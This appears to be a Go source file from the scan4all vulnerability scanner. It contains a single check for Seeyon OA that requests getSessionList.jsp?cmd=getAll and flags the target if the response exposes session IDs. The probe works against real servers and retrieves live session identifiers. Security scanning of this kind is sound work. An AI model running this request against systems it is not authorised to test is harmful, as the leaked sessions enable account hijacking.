package seeyon

import (
	"fmt"
	"github.com/hktalent/scan4all/pkg"
	"strings"
)

//getSessionList.jsp session 泄露

func GetSessionList(u string) bool {
	if req, err := pkg.HttpRequset(u+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "sessionID") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln seeyon GetSessionList|%s\n", u+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll"))
			return true
		}
	}
	return false
}
